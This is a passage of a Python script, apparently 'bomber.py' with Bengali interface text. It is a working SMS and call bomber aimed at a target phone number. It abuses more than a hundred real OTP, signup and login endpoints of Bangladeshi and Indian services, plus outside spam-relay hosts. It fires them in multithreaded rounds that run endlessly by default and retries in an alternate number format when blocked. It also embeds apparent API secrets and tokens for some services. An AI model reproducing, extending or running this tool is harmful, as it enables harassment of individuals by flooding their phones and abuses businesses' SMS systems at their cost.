    r3 = c.post("https://mcprod.aarong.com/graphql",
                json={"query": "mutation resendOtp($email:String,"
                               "$mobile_number:String!,$type:String!)"
                               "{resendOtp(input:{email:$email,"
                               "mobile_number:$mobile_number,type:$type})}",
                      "variables": {"email": "", "mobile_number": x.full,
                                    "type": "mobile_number"}}, headers=h)
    return merge(r1, r2, r3)


@api("Arogga SMS (app)")
def a65(c, x):
    return c.post("https://api.arogga.com/auth/v1/sms/send"
                  "?f=app&v=6.2.7&os=android&osv=33",
                  data={"mobile": x.full, "fcmToken": "cQYjPWHHTDu1IVXnW90Xqs",
                        "referral": ""},
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "User-Agent": "okhttp/4.9.2"})


@api("Sundarban Courier GraphQL")
def a66(c, x):
    return c.post("https://api-gateway.sundarbancourierltd.com/graphql",
                  json={"operationName": "CreateAccessToken",
                        "variables": {"accessTokenFilter": {"userName": x.full}},
                        "query": "mutation CreateAccessToken($accessTokenFilter:"
                                 "AccessTokenInput!){createAccessToken("
                                 "accessTokenFilter:$accessTokenFilter){message "
                                 "statusCode result{phone otpCounter __typename}"
                                 " __typename}}"},
                  headers={**J, "origin": "https://customer.sundarbancourierltd.com",
                           "referer": "https://customer.sundarbancourierltd.com/"})


@api("QuizTime OTP")
def a67(c, x):
    return c.post("https://developer.quiztime.gamehubbd.com/api/v2.0/send-otp",
                  json={"country_code": "+88", "phone": x.full}, headers=J)


@api("DressUp OTP")
def a68(c, x):
    return c.post("https://dressup.com.bd/wp-json/api/flutter_user/digits/send_otp",
                  json={"country_code": "+880", "mobile": x.bare,
                        "type": "login", "whatsapp": False},
                  headers={"content-type": "application/json; charset=utf-8",
                           "User-Agent": "Dart/3.5 (dart:io)"})


@api("Ghoori Learning OTP")
def a69(c, x):
    return c.post("https://api.ghoorilearning.com/api/auth/signup/otp"
                  "?_app_platform=web",
                  json={"mobile_no": x.full},
                  headers={**J, "origin": "https://ghoorilearning.com",
                           "referer": "https://ghoorilearning.com/"})


@api("GariBook Login")
def a70(c, x):
    return c.post("https://api.garibookadmin.com/api/v3/user/login",
                  json={"mobile": x.full, "recaptcha_token": "garibookcaptcha",
                        "channel": "web"},
                  headers={**J, "origin": "https://garibook.com",
                           "referer": "https://garibook.com/"})


@api("FabriLife Signup+OTP")
def a71(c, x):
    r1 = c.post("https://fabrilife.com/api/wp-json/wc/v2/user/register",
                json={"name": rnd(6, string.ascii_letters),
                      "email": f"{x.full}@gmail.com", "phone": x.full,
                      "password": "Riyaz@123"}, headers=J)
    r2 = c.post(f"https://fabrilife.com/api/wp-json/wc/v2/user/phone-login/{x.full}",
                headers={"otpkey": "uzmgAMHfQrukDqV1ecZ2xJGwqjiVPnE0byuqw2MW"})
    return merge(r1, r2)


@api("Kotha deviceAuth + OTP")
def a72(c, x):
    dev = f"{random.randint(1, 10**9)}-{random.randint(1, 10**9)}"
    r1 = c.post("https://user.kotha.im/mobile/api/deviceAuthWithRecipientStatus",
                json={"deviceId": dev, "recipient": "+88" + x.full},
                headers={**J, "User-Agent": "okhttp/4.12.0"})
    try:
        tok = json.loads(r1.body).get("token")
    except Exception:
        tok = None
    if not tok:
        return r1
    r2 = c.post("https://user.kotha.im/mobile/api/sendOTPV2",
                json={"deviceId": dev, "recipient": "+88" + x.full,
                      "retryAttempt": 0},
                headers={**J, "Authorization": tok,
                         "User-Agent": "kotha-android-version_0.1.20241002"})
    return merge(r1, r2)


@api("BTCL BDIA OTP")
def a73(c, x):
    return c.post("https://bdia.btcl.com.bd/client/client/"
                  "registrationMobVerification-2.jsp?moduleID=1",
                  data={"actionType": "otpSend", "mobileNo": x.bare},
                  headers={"Content-Type": "application/x-www-form-urlencoded",
                           "origin": "https://bdia.btcl.com.bd",
                           "referer": "https://bdia.btcl.com.bd/client/client/"
                                      "registrationMobVerification-1.jsp?moduleID=1"})


@api("BTCL PhoneBill OTP (1)")
def a74(c, x):
    return c.post("https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
                  json={"phoneNbr": x.full, "email": "", "OTPType": 1,
                        "userName": ""},
                  headers={**J, "origin": "https://phonebill.btcl.com.bd",
                           "referer": "https://phonebill.btcl.com.bd/register"})


@api("BTCL PhoneBill OTP (15)")
def a75(c, x):
    return c.post("https://phonebill.btcl.com.bd/api/ecare/anonym/sendOTP.json",
                  json={"OTPType": 15, "userName": x.full,
                        "isNewPhoneOrEmail": False},
                  headers={**J, "origin": "https://phonebill.btcl.com.bd",
                           "referer": "https://phonebill.btcl.com.bd/login"})


@api("BMB Endpoint")
def a76(c, x):
    return c.get("http://206.189.134.221/wordpress/wp-content/uploads/bmb/" + x.full)


@api("Ultranetrn API")
def a77(c, x):
    return c.get("http://ultranetrn.com.br/fonts/api.php?number=" + x.full)


@api("XRootCobra")
def a78(c, x):
    return c.get(f"https://xrootcobrax.onrender.com/roct_main.php?phone={x.full}"
                 "&nid=5845888855")


@api("MyGP OTP Login")
def a79(c, x):
    return c.get("https://mygp.grameenphone.com/mygpapi/v2/otp-login"
                 f"?msisdn=88{x.full}&lang=en&ng=0")


@api("Shukhee.com")
def a80(c, x):
    return c.get(f"https://auth.shukhee.com/register?mobile=+88{x.full}&_rsc=1jwvn")


@api("eCourier OTP")
def a81(c, x):
    return c.get("https://backoffice.ecourier.com.bd/api/web/"
                 f"individual-send-otp?mobile={x.full}")


@api("Binge.buzz GET OTP")
def a82(c, x):
    return c.get(f"https://ss.binge.buzz/otp/send/login{x.full}")


@api("Daktarbhai OTP")
def a83(c, x):
    return c.get("https://api.daktarbhai.com/api/v2/otp/generate?=&"
                 "api_key=BUFWICFGGNILMSLIYUVH&"
                 "api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE"
                 f"&mobile=%2B88{x.full}&platform=app&activity=login")


@api("APU Inky API")
def a84(c, x):
    return c.get("https://apu-inky.vercel.app/send?number=" + x.full)


def _lmnx(n):
    @api(f"LMNX9 API {n}")
    def _f(c, x):
        return c.get(f"https://lmnx9-sms-spam-v11.onrender.com/api{n}?number={x.full}")
    return _f


for _i in range(1, 17):
    _lmnx(_i)


@api("BeepKart OTP")
def a101(c, x):
    return c.post("https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
                  json={"phone": x.full, "city": 362}, headers=J)


@api("Smytten OTP")
def a102(c, x):
    return c.post("https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
                  json={"phone": x.full, "email": "test@example.com"}, headers=J)


@api("MyHubble Money")
def a103(c, x):
    return c.post("https://api.myhubble.money/v1/auth/otp/generate",
                  json={"phoneNumber": x.full, "channel": "SMS"}, headers=J)


@api("Housing.com OTP")
def a104(c, x):
    return c.post("https://login.housing.com/api/v2/send-otp",
                  json={"phone": x.full, "country_url_name": "in"}, headers=J)


@api("RentoMojo Check")
def a105(c, x):
    return c.post("https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
                  json={"phone": x.full}, headers=J)


@api("Khatabook OTP")
def a106(c, x):
    return c.post("https://api.khatabook.com/v1/auth/request-otp",
                  json={"phone": x.full, "app_signature": "wk+avHrHZf2"}, headers=J)


@api("Animall Login")
def a107(c, x):
    return c.post("https://animall.in/zap/auth/login",
                  json={"phone": x.full, "signupPlatform": "NATIVE_ANDROID"},
                  headers=J)


@api("Cosmofeed Auth")
def a108(c, x):
    return c.post("https://prod.api.cosmofeed.com/api/user/authenticate",
                  json={"phone": x.full, "version": "1.4.28"}, headers=J)


@api("Spencer's OTP")
def a109(c, x):
    return c.post("https://jiffy.spencers.in/user/auth/otp/send",
                  json={"mobile": x.full}, headers=J)


@api("Deshal.net Login")
def a110(c, x):
    return c.post("https://app.deshal.net/api/auth/login",
                  json={"phone": x.full}, headers=J)


@api("GP Web Login")
def a111(c, x):
    return c.post("https://weblogin.grameenphone.com/backend/api/v1/otp",
                  json={"msisdn": x.full}, headers=J)


@api("BusBD Auth")
def a112(c, x):
    return c.post("https://api.busbd.com.bd/api/auth",
                  json={"phone": "+88" + x.full}, headers=J)


@api("Bohubrihi OTP")
def a113(c, x):
    return c.post("https://bb-api.bohubrihi.com/public/activity/otp",
                  json={"phone": x.full, "intent": "login"}, headers=J)


@api("Jatri Global OTP")
def a114(c, x):
    return c.post("https://user-api.jslglobal.co/v2/send-otp",
                  json={"phone": "+88" + x.full,
                        "jatri_token": "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"},
                  headers=J)


@api("RedX Merchant OTP")
def a115(c, x):
    return c.post("https://api.redx.com.bd/v1/merchant/registration/"
                  "generate-registration-otp",
                  json={"mobile": "+88" + x.full}, headers=J)


@api("RabbitHoleBD OTP")
def a116(c, x):
    return c.post("https://apix.rabbitholebd.com/appv2/login/requestOTP",
                  json={"mobile": "+88" + x.full}, headers=J)


@api("Qcoom OTP")
def a117(c, x):
    return c.post("https://auth.qcoom.com/api/v1/otp/send",
                  json={"mobileNumber": "+88" + x.full}, headers=J)


@api("Garibook Admin v4")
def a118(c, x):
    return c.post("https://api.garibookadmin.com/api/v4/user/login",
                  json={"mobile": "+880" + x.bare,
                        "recaptcha_token": "garibookcaptcha",
                        "channel": "web"}, headers=J)


@api("Training.gov.bd OTP")
def a119(c, x):
    return c.post("https://training.gov.bd/backoffice/api/user/sendOtp",
                  json={"mobile": x.full}, headers=J)


@api("Shikho Discount OTP")
def a120(c, x):
    return c.post("https://api.shikho.com/public/activity/otp",
                  json={"phone": x.full, "intent": "ap-discount-request"},
                  headers=J)


@api("Easy.com.bd Register")
def a121(c, x):
    return c.post("https://core.easy.com.bd/api/v1/registration",
                  json={"name": "Tusar", "email": rnd_mail(),
                        "mobile": x.full, "password": "amitusar",
                        "password_confirmation": "amitusar",
                        "device_key": "b2c8ddd3be"}, headers=J)


@api("Robi DA API")
def a122(c, x):
    return c.post("https://da-api.robi.com.bd/da-nll/otp/send",
                  json={"msisdn": x.full}, headers=J)


@api("Addatimes Login")
def a123(c, x):
    return c.post("https://app.addatimes.com/api/login",
                  json={"phone": x.full, "country_code": "BD"}, headers=J)


@api("Regal Furniture OTP")
def a124(c, x):
    return c.post("https://regalfurniturebd.com/api/auth/otp-generate",
                  json={"phone": x.full, "verification_code": ""}, headers=J)


@api("Regal Furniture Register")
def a125(c, x):
    return c.post("https://regalfurniturebd.com/api/auth/register",
                  json={"name": "User", "email": rnd_mail(), "phone": x.full,
                        "password": "password123"}, headers=J)


@api("TimezoneBD OTP")
def a126(c, x):
    return c.post("https://backend.timezonebd.com/api/v1/user/otp-request",
                  json={"phone": x.full}, headers=J)


@api("TimezoneBD Register")
def a127(c, x):
    return c.post("https://backend.timezonebd.com/api/v1/user/regnewcustomer",
                  json={"name": "Tusar", "email": rnd_mail(), "phone": x.full,
                        "password": "aAeMY@5hG8iUfD4",
                        "password_confirmation": "aAeMY@5hG8iUfD4"}, headers=J)


@api("UpaySystem Wallet Verify")
def a128(c, x):
    return c.post("https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/",
                  json={"device_uuid": "dev_123", "firebase_token": "token_123",
                        "geo_location": "loc_123", "mno": "Grameenphone",
                        "wallet_number": x.full}, headers=J)


@api("Chorki Web Login")
def a129(c, x):
    return c.post("https://api-dynamic.chorki.com/v2/auth/login"
                  "?country=BD&platform=web&language=en",
                  json={"number": "+880" + x.bare}, headers=J)


@api("Pkluck2 SMS")
def a130(c, x):
    return c.post("https://www.pkluck2.com/wps/verification/sms/noLogin",
                  json={"mobileNum": x.full, "countryDialingCode": "880"},
                  headers=J)


@api("Care-Box Register")
def a131(c, x):
    return c.post("https://newprod.api-care-box.click:444/api/user/register/?version=otp",
                  json={"Name": "Abdullah Al Mamun", "Phone": "+880" + x.bare},
                  headers=J)


@api("Jayabaji BD Confirm")
def a132(c, x):
    return c.post("https://www.jayabajibd.life/api/register/confirm",
                  json={"mobileno": x.full, "username": rnd(12),
                        "firstname": "", "new_password": "tPNVOcen!6XEz3b",
                        "confirm_new_password": "tPNVOcen!6XEz3b",
                        "country_code": "880", "country": "BD",
                        "currency": "BDT", "ref": "", "language": "en"},
                  headers=J)


@api("Swap OTP v2")
def a133(c, x):
    return c.post("https://api.swap.com.bd/api/v1/send-otp/v2",
                  json={"phone": x.full}, headers=J)


@api("Swap OTP v1")
def a134(c, x):
    return c.post("https://api.swap.com.bd/api/v1/send-otp",
                  json={"phone": x.full}, headers=J)


@api("BdTickets OTP Send")
def a135(c, x):
    return c.post("https://apiv1.bdtickets.com/api/v1/auth/otp/send",
                  json={"phone": "+880" + x.bare}, headers=J)


@api("SendMySMS")
def a136(c, x):
    return c.post("https://sendmysms.net/send-otp.php",
                  data={"phonenumber": x.full},
                  headers={"Content-Type": "application/x-www-form-urlencoded"})


@api("Eonbazar Login")
def a137(c, x):
    return c.post("https://app.eonbazar.com/api/auth/login",
                  json={"method": "otp", "mobile": x.full}, headers=J)


@api("NESCO SSL Wireless")
def a138(c, x):
    return c.post("http://nesco.sslwireless.com/api/v1/login",
                  json={"phone_number": x.full}, headers=J)


@api("Bazar365 OTP")
def a139(c, x):
    return c.post("https://www.bazar365.store/api/v1/auth/sendPhoneOtp",
                  json={"phone": x.full, "applicationChannel": "WEB_APP"},
                  headers=J)


@api("Bioscopelive Alt")
def a140(c, x):
    return c.post("https://www.bioscopelive.com/en/login/send-otp"
                  f"?phone=880{x.bare}&operator=bd-otp",
                  json={"phone": x.full}, headers=J)


@api("Wakefit SMS")
def a141(c, x):
    return c.post("https://api.wakefit.co/api/consumer-sms-otp/",
                  json={"mobile": x.full}, headers=J)


@api("Hungama OTP")
def a142(c, x):
    return c.post("https://communication.api.hungama.com/v1/communication/otp",
                  json={"mobileNo": x.full, "countryCode": "+91",
                        "appCode": "un", "messageId": "1", "device": "web"},
                  headers=J)


@api("Doubtnut Login")
def a143(c, x):
    return c.post("https://api.doubtnut.com/v4/student/login",
                  json={"phone_number": x.full, "language": "en"}, headers=J)


@api("PenPencil Resend OTP")
def a144(c, x):
    return c.post("https://api.penpencil.co/v1/users/resend-otp?smsType=1",
                  json={"organizationId": "5eb393ee95fab7468a79d189",
                        "mobile": x.full}, headers=J)


@api("Coke Studio OTP")
def a145(c, x):
    return c.post("https://cokestudio23.sslwireless.com/api/store-and-send-otp",
                  json={"msisdn": "880" + x.bare, "name": "Aulad Hosen",
                        "email": rnd_mail("ulad"), "dob": "2000-01-01",
                        "occupation": "N/A", "gender": "male"}, headers=J)


@api("Coke Studio GP Check")
def a146(c, x):
    return c.post("https://cokestudio23.sslwireless.com/api/check-gp-number",
                  json={"msisdn": x.full}, headers=J)


@api("Fundesh OTP")
def a147(c, x):
    return c.post("https://fundesh.com.bd/api/auth/generateOTP?service_key=",
                  json={"msisdn": x.bare}, headers=J)


@api("Airtel Login OTP")
def a148(c, x):
    return c.post("https://api.bd.airtel.com/v1/account/login/otp",
                  json={"phone_number": x.full}, headers=J)


@api("Airtel Register OTP")
def a149(c, x):
    return c.post("https://api.bd.airtel.com/v1/account/register/otp",
                  json={"phone_number": x.full}, headers=J)


@api("Rokomari OTP")
def a150(c, x):
    return c.get("https://www.rokomari.com/otp/send"
                 f"?emailOrPhone=880{x.bare}&countryCode=BD")


@api("Cricbuzz Signup")
def a151(c, x):
    return c.post("https://m.cricbuzz.com/cbplus/auth/user/signup",
                  json={"username": rnd_mail()}, headers=J)


@api("Paragon Food Login")
def a152(c, x):
    return c.post("https://api.paragonfood.com.bd/auth/customerlogin",
                  json={"emailOrPhone": x.full}, headers=J)


@api("Prothom Alo OTP")
def a153(c, x):
    return c.post("https://prod-api.viewlift.com/identity/signup?site=prothomalo",
                  json={"requestType": "send", "phoneNumber": "+880" + x.bare,
                        "emailConsent": True, "whatsappConsent": False},
                  headers=J)


@api("Hoichoi OTP")
def a154(c, x):
    return c.post("https://prod-api.viewlift.com/identity/signup?site=hoichoitv",
                  json={"requestType": "send", "phoneNumber": "+880" + x.bare,
                        "emailConsent": True, "whatsappConsent": True},
                  headers=J)


@api("Paperfly Registration")
def a155(c, x):
    return c.post("https://go-app.paperfly.com.bd/merchant/api/react/"
                  "registration/request_registration.php",
                  json={"full_name": "Hjbdnd", "company_name": "Hello",
                        "email_address": rnd_mail("ulad"), "phone_number": x.full},
                  headers=J)


@api("Sundarban PreBooking PIN")
def a156(c, x):
    return c.post("https://tracking.sundarbancourierltd.com/PreBooking/SendPin",
                  json={"PreBookingRegistrationPhoneNumber": x.full}, headers=J)


@api("Sundarban Username Check")
def a157(c, x):
    return c.post("https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername",
                  json={"PreBookingRegistrationUsername": x.full}, headers=J)


@api("1024Tera Register")
def a158(c, x):
    return c.post("https://www.1024tera.com/wap/outlogin/phoneRegister"
                  "?selectStatus=true", json={"phone": x.full}, headers=J)


@api("eCourier OTP (alt)")
def a159(c, x):
    return c.get("https://backoffice.ecourier.com.bd/api/web/"
                 f"individual-send-otp?mobile={x.plus88}")


# ══════════════════════════════════════════════════════════════════════
#  ░░  CALL BOMBERS  ░░
# ══════════════════════════════════════════════════════════════════════

@api("DarkTools CALL #1", kind="call")
def c1(c, x):
    return c.get(f"https://darktoolshub.net/sms/call.php?num={x.full}")


@api("DarkTools CALL #2", kind="call")
def c2(c, x):
    return c.get(f"https://darktoolshub.net/sms/call.php?num={x.full}")


@api("DarkTools CALL #3", kind="call")
def c3(c, x):
    return c.get(f"https://darktoolshub.net/sms/call.php?num={x.plus88}")

@api("CobraExpire CALL #4", kind="call")
def c4(c, x):
    return c.get(f"https://CobraExpire.freedev.app/roct_main.php?phone={x.full}")


@api("CobraExpire CALL #5", kind="call")
def c5(c, x):
    return c.get(f"https://CobraExpire.freedev.app/roct_main.php?phone={x.full}")


@api("CobraExpire CALL #6", kind="call")
def c6(c, x):
    return c.get(f"https://CobraExpire.freedev.app/roct_main.php?phone={x.plus88}")


# ══════════════════════════════════════════════════════════════════════
#  SELECTION
# ══════════════════════════════════════════════════════════════════════
def parse_selection(raw, only_kind=None):
    raw = (raw or "all").strip().lower()
    if raw == "all":
        ids = sorted(REG)
    elif raw == "list":
        return []
    else:
        ids = []
        for part in raw.replace(" ", "").split(","):
            if not part:
                continue
            if "-" in part:
                try:
                    a, b = part.split("-", 1)
                    ids += [n for n in range(int(a), int(b) + 1) if n in REG]
                except ValueError:
                    pass
            else:
                try:
                    n = int(part)
                    if n in REG:
                        ids.append(n)
                except ValueError:
                    pass
        ids = sorted(set(ids))
    if only_kind:
        ids = [i for i in ids if REG[i]["kind"] == only_kind]
    return ids


def show_list():
    sms = sum(1 for e in REG.values() if e["kind"] == "sms")
    cal = sum(1 for e in REG.values() if e["kind"] == "call")
    out(f"\n{C.B}মোট এন্ডপয়েন্ট: {len(REG)}  ({C.BLU}SMS {sms}{C.R} + "
        f"{C.MAG}CALL {cal}{C.R}){C.R}\n")
    for i in sorted(REG):
        e = REG[i]
        tag = f"{C.MAG}CALL{C.R}" if e["kind"] == "call" else f"{C.BLU}SMS {C.R}"
        out(f"  {C.GRY}[{i:03d}]{C.R} {tag}  {e['name']}")
    out()


# ══════════════════════════════════════════════════════════════════════
#  STATS
# ══════════════════════════════════════════════════════════════════════
class Stats:
    def __init__(self):
        self.lock = threading.Lock()
        self.data = {i: {"name": REG[i]["name"], "kind": REG[i]["kind"],
                         "hit": 0, "ok": 0, "fail": 0} for i in REG}
        self.score = {i: 0 for i in REG}
        self.total_ok = 0
        self.total_fail = 0
        self.rounds_done = 0
        self.started = time.time()

    def add(self, api_id, res):
        with self.lock:
            d = self.data[api_id]
            d["hit"] += 1
            if res.ok:
                d["ok"] += 1
                self.total_ok += 1
                self.score[api_id] = min(self.score[api_id] + 1, 50)
            else:
                d["fail"] += 1
                self.total_fail += 1
                self.score[api_id] = max(self.score[api_id] - 1, -10)

    def snapshot(self):
        with self.lock:
            return self.total_ok, self.total_fail, self.rounds_done


# ══════════════════════════════════════════════════════════════════════
#  ENGINE
# ══════════════════════════════════════════════════════════════════════
class Engine:
    def __init__(self, ctx, ids, loops, workers, timeout, retries,
                 cooldown, rounds, priority, alt_retry, quiet, log_path):
        self.ctx = ctx
        self.ctx_alt = Ctx("+" + ctx.p88) if ctx.p88 else ctx
        self.ids = ids
        self.loops = loops
        self.workers = workers
        self.cooldown = cooldown
        self.rounds = rounds
        self.priority = priority
        self.alt_retry = alt_retry
        self.quiet = quiet
        self.log_path = log_path
        self.client = Client(timeout=timeout, retries=max(0, retries))
        self.stats = Stats()
        self.counter = {"n": 0, "lock": threading.Lock()}
        self.log_lock = threading.Lock()

    # ── logging ───────────────────────────────────────────────
    def log(self, line):
        if not self.log_path:
            return
        with self.log_lock:
            try:
                with open(self.log_path, "a", encoding="utf-8") as fh:
                    fh.write(line + "\n")
            except Exception:
                pass

    # ── ordering ──────────────────────────────────────────────
    def order(self):
        ids = list(self.ids)
        random.shuffle(ids)
        if self.priority:
            ids.sort(key=lambda i: -self.stats.score[i])
        return ids

    # ── one api call ──────────────────────────────────────────
    def hit(self, api_id):
        fn = REG[api_id]["fn"]
        try:
            res = fn(self.client, self.ctx)
        except Exception as e:
            res = Result(False, 0, repr(e)[:100])

        if not res.ok and self.alt_retry and res.status in (0, 400, 403, 429, 500, 502, 503):
            try:
                res2 = fn(self.client, self.ctx_alt)
                if res2.ok:
                    res = res2
            except Exception:
                pass

        self.stats.add(api_id, res)

        if not self.quiet:
            with self.counter["lock"]:
                self.counter["n"] += 1
                n = self.counter["n"]
            col = C.GRN if res.ok else C.RED
            mark = "OK " if res.ok else "ERR"
            out(f"{C.GRY}[{n:>5}]{C.R} {col}{mark}{C.R} "
                f"{str(res.status):>4} {C.DIM}#{api_id:03d} "
                f"{REG[api_id]['name']}{C.R}")

        if self.log_path:
            self.log(f"{_dt.datetime.now().isoformat(timespec='seconds')}\t"
                     f"{api_id}\t{REG[api_id]['name']}\t{res.status}\t"
                     f"{'OK' if res.ok else 'FAIL'}")
        return res

    # ── one round ─────────────────────────────────────────────
    def fire_round(self, round_no, ids):
        slots = len(ids) * self.loops
        if not self.quiet:
            out(f"\n{C.B}{C.MAG}▚ রাউন্ড {round_no} ▞{C.R} {C.GRY}— "
                f"{len(ids)} এন্ডপয়েন্ট × {self.loops} = {slots} হিট{C.R}")
        with ThreadPoolExecutor(max_workers=max(1, self.workers)) as pool:
            futs = []
            for i in ids:
                for _ in range(self.loops):
                    if STOP.is_set():
                        break
                    futs.append(pool.submit(self.hit, i))
            for f in as_completed(futs):
                if HARD_STOP.is_set():
                    break

    # ── cooldown (interruptible) ──────────────────────────────
    def wait(self, sec):
        if sec <= 0:
            return
        end = time.time() + sec
        while time.time() < end and not STOP.is_set():
            time.sleep(0.15)

    # ── dashboard ─────────────────────────────────────────────
    def dashboard(self):
        while not STOP.is_set():
            time.sleep(10)
            if STOP.is_set():
                break
            ok, fail, rnd = self.stats.snapshot()
            el = time.time() - self.stats.started
            rate = (ok / (ok + fail) * 100) if (ok + fail) else 0
            out(f"{C.GRY}── {BRAND} ── রাউন্ড {rnd} │ {el:.0f}s │ "
                f"{C.GRN}✓{ok}{C.GRY} {C.RED}✗{fail}{C.GRY} │ {rate:.1f}% ──{C.R}")

    # ── main loop ─────────────────────────────────────────────
    def run(self):
        threading.Thread(target=self.dashboard, daemon=True).start()
        round_no = 0
        try:
            while not STOP.is_set():
                round_no += 1
                if self.rounds and round_no > self.rounds:
                    break
                self.fire_round(round_no, self.order())
                with self.stats.lock:
                    self.stats.rounds_done = round_no
                if STOP.is_set() or (self.rounds and round_no >= self.rounds):
                    break
                self.wait(self.cooldown)
        except KeyboardInterrupt:
            STOP.set()
        STOP.set()
        return round_no

    # ── report ────────────────────────────────────────────────
    def summary(self, elapsed):
        ok, fail, rnd = self.stats.snapshot()
        total = ok + fail
        rate = (ok / total * 100) if total else 0.0

        out(f"\n{C.MAG}{C.B}{'═' * 74}{C.R}")
        out(f"{C.B}{C.MAG}  {BRAND}  ::  চূড়ান্ত সামারি{C.R}")
        out(f"  রাউন্ড: {rnd}   হিট: {total}   {C.GRN}সফল: {ok}{C.R}   "
            f"{C.RED}ফেইল: {fail}{C.R}   রেট: {rate:.1f}%   সময়: {elapsed:.0f}s")
        out(f"{C.MAG}{C.B}{'═' * 74}{C.R}\n")

        rows = [d for d in self.stats.data.values() if d["hit"]]
        rows.sort(key=lambda d: (-d["ok"], d["fail"]))
        for d in rows[:50]:
            bar = "█" * min(24, d["ok"]) + "░" * min(24, d["fail"])
            out(f"  {d['ok']:>4}✓ {d['fail']:>4}✗  {C.DIM}{bar:<48}{C.R} {d['name']}")
        if len(rows) > 50:
            out(f"  {C.GRY}... আরও {len(rows) - 50} টি{C.R}")
        out(f"\n{C.GRY}  crafted by {BRAND}{C.R}\n")

    def save(self, path, elapsed):
        ok, fail, rnd = self.stats.snapshot()
        payload = {
            "brand": BRAND,
            "engine": f"v{VERSION}",
            "target": self.ctx.full,
            "timestamp": _dt.datetime.now().isoformat(timespec="seconds"),
            "elapsed_sec": round(elapsed, 1),
            "rounds": rnd,
            "summary": {"total": ok + fail, "ok": ok, "fail": fail},
            "apis": [d for d in self.stats.data.values() if d["hit"]],
        }
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, ensure_ascii=False, indent=2)
        out(f"{C.GRN}[+] রিপোর্ট: {path}{C.R}")


# ══════════════════════════════════════════════════════════════════════
#  SIGNALS
# ══════════════════════════════════════════════════════════════════════
_presses = [0]


def _on_sigint(sig, frame):
    _presses[0] += 1
    if _presses[0] == 1:
        STOP.set()
        out(f"\n{C.YEL}[!] থামার অনুরোধ — চলমান রাউন্ড শেষ করে থামছে।"
            f" আবার Ctrl+C = সাথে সাথে।{C.R}")
    else:
        HARD_STOP.set()
        out(f"\n{C.RED}[!] হার্ড স্টপ।{C.R}")
        os._exit(0)


signal.signal(signal.SIGINT, _on_sigint)


# ══════════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════════
def main():
    p = argparse.ArgumentParser(
        prog="bomber.py",
        description=f"{BRAND} — infinite SMS + call bomber engine",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    p.add_argument("phone", nargs="?", help="টার্গেট নাম্বার (01XXXXXXXXX)")
    p.add_argument("-l", "--loops", type=int, default=1, help="প্রতি রাউন্ডে প্রতি API হিট")
    p.add_argument("-w", "--workers", type=int, default=40, help="কনকারেন্ট থ্রেড")
    p.add_argument("-t", "--timeout", type=float, default=12, help="টাইমআউট (s)")
    p.add_argument("-r", "--retries", type=int, default=1, help="নেটওয়ার্ক রিট্রাই")
    p.add_argument("-c", "--cooldown", type=float, default=3,
                   help="রাউন্ডের মাঝে বিরতি সেকেন্ড (ডিফল্ট 3)")
    p.add_argument("-n", "--rounds", type=int, default=0,
                   help="কত রাউন্ড (0 = অসীম, ডিফল্ট 0)")
    p.add_argument("-a", "--api", default="all", help="all | list | 1,5,9 | 1-20")
    p.add_argument("--calls", action="store_true", help="শুধু কল এন্ডপয়েন্ট")
    p.add_argument("--sms", action="store_true", help="শুধু SMS এন্ডপয়েন্ট")
    p.add_argument("--no-priority", action="store_true",
                   help="প্রায়োরিটি শিডিউলার বন্ধ (পুরো র‍্যান্ডম)")
    p.add_argument("--no-alt", action="store_true", help="অল্টারনেট ফরম্যাট রিট্রাই বন্ধ")
    p.add_argument("-o", "--output", help="শেষে রিপোর্ট JSON সেভ")
    p.add_argument("--log", help="প্রতি হিটের লগ ফাইল")
    p.add_argument("-q", "--quiet", action="store_true", help="শুধু সামারি")
    p.add_argument("--list", action="store_true", help="সব এন্ডপয়েন্ট দেখাও")
    p.add_argument("-v", "--version", action="version",
                   version=f"{BRAND} bomber v{VERSION}")
    args = p.parse_args()

    banner()

    if args.list:
        show_list()
        return

    raw_phone = args.phone or input(f"{C.YEL}টার্গেট নাম্বার: {C.R}").strip()
    digits = re.sub(r"\D", "", raw_phone)
    if digits.startswith("880"):
        digits = digits[3:]
    elif digits.startswith("88"):
        digits = digits[2:]
    if len(digits) < 10:
        sys.exit(f"{C.RED}[!] ভুল নাম্বার: {raw_phone}{C.R}")

    ctx = Ctx(raw_phone)

    kind = None
    if args.calls and not args.sms:
        kind = "call"
    elif args.sms and not args.calls:
        kind = "sms"

    ids = parse_selection(args.api, kind)
    if not ids:
        show_list()
        sys.exit(f"{C.RED}[!] কোনো ভ্যালিড API আইডি পাওয়া যায়নি।{C.R}")

    sms_n = sum(1 for i in ids if REG[i]["kind"] == "sms")
    call_n = len(ids) - sms_n
    rounds_txt = "∞" if not args.rounds else str(args.rounds)

    out(f"{C.B}ব্র্যান্ড    :{C.R} {C.MAG}{BRAND}{C.R}  {C.GRY}v{VERSION}{C.R}")
    out(f"{C.B}টার্গেট     :{C.R} {C.GRN}{ctx.full}{C.R}")
    out(f"{C.B}এন্ডপয়েন্ট  :{C.R} {len(ids)}  ({C.BLU}SMS {sms_n}{C.R} + "
        f"{C.MAG}CALL {call_n}{C.R})")
    out(f"{C.B}রাউন্ড      :{C.R} {rounds_txt}   {C.B}লুপ/API:{C.R} {args.loops}   "
        f"{C.B}থ্রেড:{C.R} {args.workers}   {C.B}কুলডাউন:{C.R} {args.cooldown}s")
    out(f"\n{C.GRY}থামাতে Ctrl+C। অসীম মোডে চলছে — আপনি না থামালে থামবে না।{C.R}\n")

    engine = Engine(ctx, ids, max(1, args.loops), args.workers, args.timeout,
                    args.retries, max(0, args.cooldown), max(0, args.rounds),
                    not args.no_priority, not args.no_alt, args.quiet, args.log)

    t0 = time.time()
    try:
        engine.run()
    finally:
        elapsed = time.time() - t0
        engine.summary(elapsed)
        if args.output:
            engine.save(args.output, elapsed)


if __name__ == "__main__":
    main()